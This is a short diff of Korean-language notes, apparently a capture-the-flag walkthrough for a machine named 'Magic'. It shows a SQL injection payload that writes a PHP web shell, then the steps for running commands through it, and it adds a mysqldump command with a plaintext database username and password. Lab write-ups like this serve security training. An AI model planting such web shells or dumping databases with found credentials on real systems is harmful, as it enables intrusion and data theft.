@@ -185,6 +185,11 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshe
 1. 웹쉘 업로드 후 `http://target-ip/webshell.php?c=whoami` 형태로 접근
 2. `c` 파라미터를 통해 시스템 명령 실행
 
+### mysqldump
+```bash
+mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
+```
+
 </details>
 
 ---
